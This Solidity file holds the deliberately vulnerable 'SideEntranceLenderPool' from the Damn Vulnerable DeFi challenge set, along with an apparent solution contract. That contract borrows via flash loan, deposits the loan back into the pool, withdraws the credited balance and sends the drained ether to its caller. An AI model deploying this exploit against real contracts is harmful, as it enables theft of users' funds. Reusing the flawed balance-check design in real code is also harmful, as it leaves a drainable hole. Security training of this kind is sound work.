// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        
        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
            
    }
}

contract ExploitContract is IFlashLoanEtherReceiver{
    SideEntranceLenderPool public _sideEntranceLenderPool;

    constructor(address sideEntranceLenderPoolAddress){
        _sideEntranceLenderPool = SideEntranceLenderPool(sideEntranceLenderPoolAddress);
    }

    function attack(uint flashloanAmount) public payable {
        _sideEntranceLenderPool.flashLoan(flashloanAmount);
        _sideEntranceLenderPool.withdraw();
        (bool success, bytes memory data) = address(msg.sender).call{value: address(this).balance}("");
    }   

    function execute() external payable{
        _sideEntranceLenderPool.deposit{value:msg.value}();
    }

    receive() external payable { }

}
